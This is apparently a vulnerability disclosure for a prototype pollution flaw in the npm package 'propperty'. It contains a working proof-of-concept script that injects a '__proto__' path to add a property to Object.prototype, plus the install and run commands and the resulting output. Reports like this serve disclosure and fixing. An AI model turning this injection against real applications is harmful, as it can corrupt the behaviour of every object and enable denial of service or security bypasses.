# Description

Prototype Pollution in propperty

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var propperty = require("propperty")
var obj = {}
console.log("Before : " + {}.polluted);
propperty(obj,"__proto__.polluted","Yes! Its Polluted");
console.log("After : " + {}.polluted);
```

2. Execute the following commands in terminal:

```
npm i propperty # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
